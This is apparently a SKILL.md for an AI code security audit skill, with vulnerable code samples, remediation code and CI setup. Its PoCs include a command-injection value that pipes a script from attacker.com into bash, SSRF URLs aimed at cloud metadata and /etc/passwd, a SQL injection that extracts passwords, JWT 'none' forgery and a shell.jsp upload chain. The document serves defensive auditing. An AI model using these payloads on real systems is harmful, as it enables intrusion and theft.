---
name: dfyx-code-security-audit
description: Deep code security auditing skill using data flow analysis and business logic understanding for 9 languages and OWASP Top 10 vulnerabilities
triggers:
  - "audit this code for security vulnerabilities"
  - "perform a security code review"
  - "find security issues in this project"
  - "scan for code vulnerabilities"
  - "check for SQL injection and XSS"
  - "analyze this code for security flaws"
  - "run a security audit on this codebase"
  - "detect security vulnerabilities in the code"
---

# dfyx-code-security-audit

> Skill by [ara.so](https://ara.so) — Security Skills collection.

Expert-level code security auditing using deep data flow analysis and business logic understanding. Supports 9 programming languages, 10 security dimensions (OWASP Top 10+), and uses a 5-phase standardized audit protocol based on real-world WooYun vulnerability cases.

## What This Does

**dfyx_code_security_review** is a professional code security audit framework that:

- **Analyzes** source code using white-box static analysis methodology
- **Detects** vulnerabilities across 10 security dimensions (injection, auth, authorization, deserialization, file ops, SSRF, crypto, config, business logic, supply chain)
- **Validates** findings through taint tracking and attack chain construction
- **Reports** actionable security issues with PoC and remediation guidance

### Supported Languages & Frameworks

**Languages (9):** Java, Python, Go, PHP, JavaScript/Node.js, C/C++, .NET/C#, Ruby, Rust

**Frameworks (14):** Spring Boot, Django, Flask, FastAPI, Express, Koa, Gin, Laravel, Rails, ASP.NET Core, Rust Web, NestJS/Fastify, MyBatis, ProcessWire

## Installation

### For AI Coding Agents

Clone or copy the skill directory into your agent's skills folder:

```bash
# Claude Code
git clone https://github.com/EastSword/skill-dfyx_code_security_review.git ~/.claude/skills/dfyx-code-security-audit

# Cursor / Generic
git clone https://github.com/EastSword/skill-dfyx_code_security_review.git ~/ai-skills/dfyx-code-security-audit
```

### Python Dependencies (Optional Scripts)

If using the optional Python helper scripts:

```bash
pip install -r requirements.txt
# Dependencies: bandit, semgrep, safety, pyyaml, jinja2
```

## Core Concepts

### 5-Phase Audit Protocol

```
Phase 1: Reconnaissance (10%)
  ↓ Output: Architecture diagram, attack surface inventory

Phase 2: Pattern Matching (30%)
  ↓ Output: High-risk code zones

Phase 3: Taint Tracking & Validation (40%)
  ↓ Output: Confirmed vulnerabilities with PoC

Phase 4: Attack Chain Construction (15%)
  ↓ Output: Multi-stage exploit scenarios

Phase 5: Structured Reporting (5%)
  ↓ Output: Full audit report
```

### 10 Security Dimensions

| Dimension | Coverage |
|-----------|----------|
| **D1 Injection** | SQL, Command, LDAP, SSTI, SpEL, JNDI |
| **D2 Authentication** | Token, Session, JWT, Filter chains |
| **D3 Authorization** | CRUD permissions, IDOR, horizontal privilege escalation |
| **D4 Deserialization** | Java/Python/PHP gadget chains |
| **D5 File Operations** | Upload, download, path traversal |
| **D6 SSRF** | URL injection, protocol restrictions |
| **D7 Cryptography** | Key management, encryption modes, KDF |
| **D8 Configuration** | Actuator exposure, CORS, error leakage |
| **D9 Business Logic** | Race conditions, mass assignment, state machines, multi-tenancy |
| **D10 Supply Chain** | Dependency CVEs, version checks |

### Audit Modes

| Mode | Use Case | Scope | Time |
|------|----------|-------|------|
| **Quick** | CI/CD, small projects | Critical vulns, secrets, dep CVEs | 5-10 min |
| **Standard** | Regular audits | OWASP Top 10, auth/authz, crypto | 30-60 min |
| **Deep** | Critical apps, pentest prep | Full coverage, attack chains, business logic | 1-3 hours |

## Usage Patterns

### Basic Audit

```
Trigger: "audit this code for security vulnerabilities"

AI Response:
[MODE] standard
[RECON] Detected: Spring Boot 2.5.4 + MySQL + Thymeleaf
[SCOPE] 234 files, focusing on D1-D10
[PLAN] Estimated 45 minutes, expecting 8-12 findings
Proceed? (yes/no)
```

### Targeted Injection Scan

```
User: "check for SQL injection in the /api/users endpoint"

AI Analysis:
1. Locate endpoint handler
2. Trace user input (request params, body, headers)
3. Follow data flow to SQL execution
4. Verify input sanitization
5. Report findings with PoC
```

### Full Project Audit (Deep Mode)

```
User: "perform a deep security audit on /path/to/project"

AI Output:
[PHASE 1] Architecture mapping...
  - Entry points: 47 REST endpoints, 12 GraphQL resolvers
  - Data flows: Request → Controller → Service → DAO → DB
  - Auth: JWT + Spring Security filter chain
  - Tech stack: Java 11, Spring Boot 2.3.1, MyBatis 3.5.5

[PHASE 2] Pattern matching (3 parallel agents)...
  - D1 Injection: 8 potential SQL injection sinks
  - D3 Authorization: 23 endpoints lack @PreAuthorize
  - D7 Crypto: Hardcoded AES key in ConfigService.java

[PHASE 3] Taint tracking...
  [CRITICAL] SQL Injection in UserController.search()
    Source: @RequestParam("query") → userService.search(query)
    Sink: MyBatis #{query} without parameterization
    PoC: GET /api/users/search?query=admin' OR '1'='1
    
[PHASE 4] Attack chain construction...
  Chain 1: SQL Injection → Database dump → Admin credentials
  Chain 2: Missing @PreAuthorize → IDOR → Mass data extraction

[PHASE 5] Report generation...
  Total: 10 Critical, 14 High, 12 Medium, 4 Low
  Report saved to: security_audit_report_2026-06-06.md
```

## Code Examples

### Java Spring Boot - SQL Injection Detection

**Vulnerable Code:**

```java
// UserController.java
@RestController
public class UserController {
    @GetMapping("/api/users/search")
    public List<User> search(@RequestParam String keyword) {
        // VULNERABILITY: Direct string concatenation
        return userMapper.searchUsers(keyword);
    }
}

// UserMapper.xml (MyBatis)
<select id="searchUsers" resultType="User">
    SELECT * FROM users WHERE username LIKE '%${keyword}%'
    <!-- ${} causes SQL injection - no parameterization -->
</select>
```

**Agent Analysis:**

```
[D1-INJECTION-001] SQL Injection via MyBatis ${} syntax
  Location: UserMapper.xml:12
  Sink: SELECT * FROM users WHERE username LIKE '%${keyword}%'
  Source: UserController.search(@RequestParam String keyword)
  Data Flow:
    1. HTTP GET /api/users/search?keyword=USER_INPUT
    2. @RequestParam binds to String keyword (no validation)
    3. userMapper.searchUsers(keyword)
    4. MyBatis ${keyword} performs string substitution
    5. Executed as raw SQL (no prepared statement)
  
  PoC: GET /api/users/search?keyword=%27%20OR%20%271%27=%271
  Impact: Full database read access, potential RCE via INTO OUTFILE
```

**Remediation:**

```java
// Fixed: Use #{} for parameterization
<select id="searchUsers" resultType="User">
    SELECT * FROM users WHERE username LIKE CONCAT('%', #{keyword}, '%')
</select>

// Better: Add input validation
@GetMapping("/api/users/search")
public List<User> search(
    @RequestParam @Pattern(regexp = "^[a-zA-Z0-9_-]{1,50}$") String keyword
) {
    return userMapper.searchUsers(keyword);
}
```

### Python Flask - Authentication Bypass

**Vulnerable Code:**

```python
# app.py
from flask import Flask, request, jsonify
import jwt

app = Flask(__name__)
SECRET_KEY = "hardcoded_secret_123"  # D7: Hardcoded secret

@app.route('/api/admin/users')
def get_users():
    token = request.headers.get('Authorization')
    if token:
        try:
            # D2: No algorithm verification
            payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
            # D3: No role check - any valid token grants access
            users = User.query.all()
            return jsonify([u.to_dict() for u in users])
        except:
            return jsonify({'error': 'Invalid token'}), 401
    return jsonify({'error': 'No token'}), 401
```

**Agent Analysis:**

```
[D2-AUTH-003] JWT Algorithm Confusion Attack
  Location: app.py:12
  Issue: jwt.decode() accepts any algorithm in token header
  Attack: Attacker can switch to 'none' algorithm or use public key as HMAC secret
  
  PoC:
    1. Obtain valid JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
    2. Modify header to {"typ":"JWT","alg":"none"}
    3. Remove signature
    4. Request bypasses authentication

[D3-AUTHZ-001] Missing Role-Based Access Control
  Location: app.py:10-17
  Issue: No check for admin role - any authenticated user can access /api/admin/users
  
[D7-CRYPTO-002] Hardcoded Secret Key
  Location: app.py:5
  Issue: SECRET_KEY embedded in source code
  Risk: Exposed in version control, allows token forgery
```

**Remediation:**

```python
import os
from functools import wraps

# Fix D7: Use environment variable
SECRET_KEY = os.environ.get('JWT_SECRET_KEY')
if not SECRET_KEY:
    raise ValueError("JWT_SECRET_KEY must be set")

# Fix D2: Restrict algorithms
def verify_token(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        if not token:
            return jsonify({'error': 'Missing token'}), 401
        try:
            # Only allow HS256, reject 'none'
            payload = jwt.decode(
                token, 
                SECRET_KEY, 
                algorithms=['HS256'],
                options={'verify_signature': True}
            )
            request.user = payload
        except jwt.InvalidTokenError:
            return jsonify({'error': 'Invalid token'}), 401
        return f(*args, **kwargs)
    return decorated

# Fix D3: Add role check
def require_admin(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.user.get('role') != 'admin':
            return jsonify({'error': 'Admin access required'}), 403
        return f(*args, **kwargs)
    return decorated

@app.route('/api/admin/users')
@verify_token
@require_admin
def get_users():
    users = User.query.all()
    return jsonify([u.to_dict() for u in users])
```

### PHP - Command Injection

**Vulnerable Code:**

```php
<?php
// backup.php
class BackupController {
    public function createBackup() {
        $filename = $_POST['filename']; // D1: Unsanitized input
        
        // D1: Command injection via shell_exec
        $output = shell_exec("tar -czf /backups/$filename.tar.gz /var/www/data");
        
        return json_encode(['status' => 'success', 'file' => $filename]);
    }
}
?>
```

**Agent Analysis:**

```
[D1-INJECTION-002] Command Injection in shell_exec
  Location: backup.php:7
  Sink: shell_exec("tar -czf /backups/$filename.tar.gz /var/www/data")
  Source: $_POST['filename'] (no validation)
  Data Flow:
    1. POST /backup/create with filename=USER_INPUT
    2. Direct variable interpolation in shell command
    3. Executed as subprocess
  
  PoC: POST /backup/create
       Content-Type: application/x-www-form-urlencoded
       filename=test; curl http://attacker.com/shell.sh | bash;
  
  Impact: Remote Code Execution, full server compromise
```

**Remediation:**

```php
<?php
class BackupController {
    public function createBackup() {
        $filename = $_POST['filename'];
        
        // Validate: alphanumeric + hyphens only
        if (!preg_match('/^[a-zA-Z0-9_-]+$/', $filename)) {
            throw new InvalidArgumentException('Invalid filename');
        }
        
        // Use escapeshellarg() for additional safety
        $safeFilename = escapeshellarg($filename);
        
        // Better: Use PHP functions instead of shell commands
        $sourcePath = '/var/www/data';
        $destPath = "/backups/{$filename}.tar.gz";
        
        $phar = new PharData($destPath);
        $phar->buildFromDirectory($sourcePath);
        $phar->compress(Phar::GZ);
        
        return json_encode(['status' => 'success', 'file' => $filename]);
    }
}
?>
```

### Node.js Express - SSRF

**Vulnerable Code:**

```javascript
// proxy.js
const express = require('express');
const axios = require('axios');
const app = express();

app.get('/api/fetch', async (req, res) => {
    const url = req.query.url; // D6: User-controlled URL
    
    try {
        // D6: No protocol/domain validation - SSRF vulnerability
        const response = await axios.get(url);
        res.json(response.data);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});
```

**Agent Analysis:**

```
[D6-SSRF-001] Server-Side Request Forgery
  Location: proxy.js:8
  Sink: axios.get(url) where url = req.query.url
  Attack Scenarios:
    1. Internal network scan: /api/fetch?url=http://192.168.1.1:8080/admin
    2. Cloud metadata: /api/fetch?url=http://169.254.169.254/latest/meta-data/
    3. File read (file:// protocol): /api/fetch?url=file:///etc/passwd
  
  Impact: Internal network exposure, cloud credential theft, local file disclosure
```

**Remediation:**

```javascript
const express = require('express');
const axios = require('axios');
const { URL } = require('url');

const ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com'];
const BLOCKED_IPS = [
    '127.0.0.1', 'localhost',
    /^10\./, /^172\.(1[6-9]|2[0-9]|3[0-1])\./, /^192\.168\./,  // Private IPs
    /^169\.254\./  // Link-local
];

async function isAllowedURL(urlString) {
    try {
        const url = new URL(urlString);
        
        // Only allow HTTP/HTTPS
        if (!['http:', 'https:'].includes(url.protocol)) {
            return false;
        }
        
        // Whitelist domains
        if (!ALLOWED_HOSTS.includes(url.hostname)) {
            return false;
        }
        
        // Resolve and check IP (prevent DNS rebinding)
        const dns = require('dns').promises;
        const addresses = await dns.resolve4(url.hostname);
        
        for (const ip of addresses) {
            if (BLOCKED_IPS.some(blocked => 
                typeof blocked === 'string' ? ip === blocked : blocked.test(ip)
            )) {
                return false;
            }
        }
        
        return true;
    } catch {
        return false;
    }
}

app.get('/api/fetch', async (req, res) => {
    const url = req.query.url;
    
    if (!await isAllowedURL(url)) {
        return res.status(400).json({ error: 'Invalid or disallowed URL' });
    }
    
    try {
        const response = await axios.get(url, {
            timeout: 5000,
            maxRedirects: 0  // Prevent redirect-based bypasses
        });
        res.json(response.data);
    } catch (error) {
        res.status(500).json({ error: 'Fetch failed' });
    }
});
```

## Configuration

### Audit Mode Selection

```python
# scripts/code_scan.py --mode [quick|standard|deep]

# Quick mode (CI/CD)
python scripts/code_scan.py --mode quick /path/to/project

# Standard mode (default)
python scripts/code_scan.py --mode standard /path/to/project

# Deep mode (comprehensive)
python scripts/code_scan.py --mode deep /path/to/project
```

### Custom Rule Configuration

Create `custom_rules.yaml`:

```yaml
# resources/rules/custom_rules.yaml
rules:
  - id: CUSTOM-001
    name: "Internal API Key Exposure"
    severity: CRITICAL
    pattern: "INTERNAL_API_KEY\\s*=\\s*['\"][a-zA-Z0-9]{32,}['\"]"
    languages: [python, javascript, java]
    description: "Hardcoded internal API keys detected"
    
  - id: CUSTOM-002
    name: "Unsafe Pickle Usage"
    severity: HIGH
    pattern: "pickle\\.loads?\\("
    languages: [python]
    description: "Unsafe deserialization via pickle"
    validation:
      - check_source_taint: true
      - require_user_input: true
```

Load custom rules:

```bash
python scripts/code_scan.py --rules resources/rules/custom_rules.yaml /path/to/project
```

### Report Configuration

```yaml
# templates/report_config.yaml
report:
  format: markdown  # markdown | json | html
  include_poc: true
  include_code_snippets: true
  max_snippet_lines: 20
  severity_threshold: medium  # critical | high | medium | low
  
output:
  directory: ./reports
  filename_template: "security_audit_{project}_{date}.md"
  
compliance:
  frameworks: [owasp-top-10, pci-dss, cwe-top-25]
  include_mapping: true
```

## Helper Scripts

### Pattern Scanner

```bash
# Scan for specific vulnerability types
python scripts/pattern_scanner.py \
  --type sql_injection \
  --language java \
  /path/to/project
```

### Taint Analysis

```bash
# Deep taint tracking from user input to sink
python scripts/data_flow_analyzer.py \
  --entry-point "UserController.search" \
  --sink "MyBatis.select" \
  /path/to/project
```

### Secret Detection

```bash
# Find hardcoded secrets
python scripts/secret_finder.py \
  --output secrets_report.json \
  /path/to/project
```

### Dependency Analysis

```bash
# Check for vulnerable dependencies
python scripts/dependency_analyzer.py \
  --check-cve \
  --output deps_report.json \
  /path/to/project
```

## Common Troubleshooting

### False Positives

**Issue:** Agent reports sanitized input as vulnerable

**Solution:** Verify sanitization context:

```
User: "The input is validated by Spring's @Pattern annotation"

Agent: Re-analyzing with annotation context...
  - @Pattern(regexp="^[a-zA-Z0-9]+$") provides basic validation
  - However, still vulnerable to SQL injection via LIKE wildcards
  - Recommendation: Use parameterized queries (#{}) instead of ${}
```

### Missing Vulnerabilities

**Issue:** Known vulnerability not detected in Quick mode

**Solution:** Use Standard or Deep mode for comprehensive coverage:

```bash
# Quick mode focuses on high-confidence, high-severity issues
python scripts/code_scan.py --mode quick /project  # Might miss edge cases

# Deep mode enables full taint tracking and business logic analysis
python scripts/code_scan.py --mode deep /project   # Catches complex chains
```

### Performance Issues

**Issue:** Audit takes too long on large codebase

**Solution:** Use targeted scans:

```bash
# Scan specific directories
python scripts/code_scan.py --include "src/main/java/com/app/controllers" /project

# Exclude test files
python scripts/code_scan.py --exclude "*/test/*,*/tests/*" /project

# Focus on specific dimensions
python scripts/code_scan.py --dimensions D1,D2,D3 /project
```

### Language-Specific Issues

**Issue:** Framework-specific patterns not recognized

**Solution:** Update framework detection rules in `resources/knowledge/architecture_analysis.md`:

```yaml
frameworks:
  spring_boot:
    patterns:
      - "org.springframework.boot.SpringApplication"
      - "@SpringBootApplication"
    entry_points:
      - "@RestController"
      - "@RequestMapping"
    sinks:
      sql_injection:
        - "JdbcTemplate.query"
        - "EntityManager.createNativeQuery"
```

## Advanced Patterns

### Multi-Stage Attack Chain

```
User: "find attack chains that lead to RCE"

Agent Analysis:
[CHAIN-001] SQL Injection → Admin Account → File Upload RCE
  Stage 1: SQL Injection in /api/users/search
    - Bypass authentication filter
    - Extract admin password hash from database
    
  Stage 2: Bruteforce or Rainbow Table
    - Crack bcrypt hash (weak rounds=4)
    - Gain admin credentials
    
  Stage 3: Authenticated File Upload
    - POST /admin/upload with .jsp file
    - No extension whitelist validation
    - Files served from /uploads (executable context)
    
  Stage 4: Remote Code Execution
    - Access uploaded shell.jsp
    - Execute OS commands via Runtime.getRuntime().exec()
  
  Combined PoC:
    1. GET /api/users/search?query=admin' UNION SELECT password FROM users--
    2. Crack hash: hashcat -m 3200 hash.txt wordlist.txt
    3. Login as admin
    4. Upload shell.jsp
    5. GET /uploads/shell.jsp?cmd=whoami
```

### Business Logic Vulnerability

```
User: "check for race conditions in payment processing"

Agent Analysis:
[D9-LOGIC-004] Race Condition in Order Payment
  Location: OrderService.processPayment()
  
  Vulnerable Code:
    public void processPayment(Long orderId, Long userId) {
        Order order = orderRepo.findById(orderId);
        if (order.getStatus() != PAID) {  // Check
            // ... process payment ...
            order.setStatus(PAID);          // Update (non-atomic)
            orderRepo.save(order);
        }
    }
  
  Attack: Send concurrent requests
    Thread 1: POST /api/orders/123/pay → Check passes → Delay
    Thread 2: POST /api/orders/123/pay → Check passes → Payment processed
    Thread 1: Resumes → Payment processed again (double charge)
  
  Remediation:
    @Transactional(isolation = Isolation.SERIALIZABLE)
    public void processPayment(Long orderId, Long userId) {
        Order order = orderRepo.findByIdForUpdate(orderId);  // SELECT FOR UPDATE
        if (order.getStatus() != PAID) {
            // Atomic check-and-update within transaction
            paymentGateway.charge(order.getAmount());
            order.setStatus(PAID);
            orderRepo.save(order);
        }
    }
```

## Knowledge Base

The skill uses 13 specialized knowledge documents in `resources/knowledge/`:

- `architecture_analysis.md` - Framework detection, entry point mapping
- `pattern_scanning.md` - Vulnerability pattern database
- `taint_analysis_enhanced.md` - Advanced data flow tracking
- `vulnerability_validation.md` - PoC generation and verification
- `attack_chain_analysis.md` - Multi-stage exploit construction
- `secret_detection.md` - Credential and API key detection
- `dependency_analysis.md` - CVE mapping for dependencies
- `anti_hallucination.md` - Evidence-based validation mechanisms

## Real-World Case Studies

The skill includes 100+ real vulnerability cases from WooYun (2010-2016) in `resources/wooyun/wooyun_cases_by_vulnerability_type.md`:

- SQL Injection (35 cases)
- Authentication Bypass (12 cases)
- File Upload RCE (18 cases)
- SSRF (8 cases)
- Deserialization (15 cases)
- Business Logic (12 cases)

Each case includes: vulnerable code, attack vector, PoC, and remediation.

## Environment Variables

```bash
# Required for Docker-based validation
export DOCKER_ENABLED=true

# Optional: Custom tool paths
export SEMGREP_PATH=/usr/local/bin/semgrep
export BANDIT_PATH=/usr/local/bin/bandit

# Report output
export AUDIT_REPORT_DIR=./security_reports
export AUDIT_REPORT_FORMAT=markdown  # markdown | json | html

# API keys for dependency scanning (optional)
export SNYK_API_KEY  # For Snyk integration
export GITHUB_TOKEN  # For GitHub Advisory DB
```

## Integration with CI/CD

### GitHub Actions

```yaml
# .github/workflows/security-audit.yml
name: Security Code Audit

on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
      
      - name: Install dfyx-audit
        run: |
          git clone https://github.com/EastSword/skill-dfyx_code_security_review.git
          cd skill-dfyx_code_security_review
          pip install -r requirements.txt
      
      - name: Run Security Audit
        run: |
          python scripts/code_scan.py \
            --mode standard \
            --output report.json \
            --fail-on high \
            .
      
      - name: Upload Report
        uses: actions/upload-artifact@v3
        if: always()
        with:
          name: security-audit-report
          path: report.json
```

### GitLab CI

```yaml
# .gitlab-ci.yml
security_audit:
  stage: test
  image: python:3.9
  script:
    - git clone https://github.com/EastSword/skill-dfyx_code_security_review.git
    - cd skill-dfyx_code_security_review && pip install -r requirements.txt && cd ..
    - python skill-dfyx_code_security_review/scripts/code_scan.py --mode quick --output audit.json .
  artifacts:
    reports:
      security: audit.json
    when: always
```

## Best Practices for AI Agents

When using this skill, agents should:

1. **Always verify file paths** before reporting vulnerabilities
2. **Provide complete data flows** from source to sink
3. **Include actual code snippets** (not descriptions)
4. **Generate testable PoCs** when possible
5. **Suggest multiple remediation options** (secure coding + framework-specific)
6. **Cross-reference CWE/OWASP** classifications
7. **Validate findings** through static analysis + dynamic testing

## License

MIT License - For educational and security research purposes only.
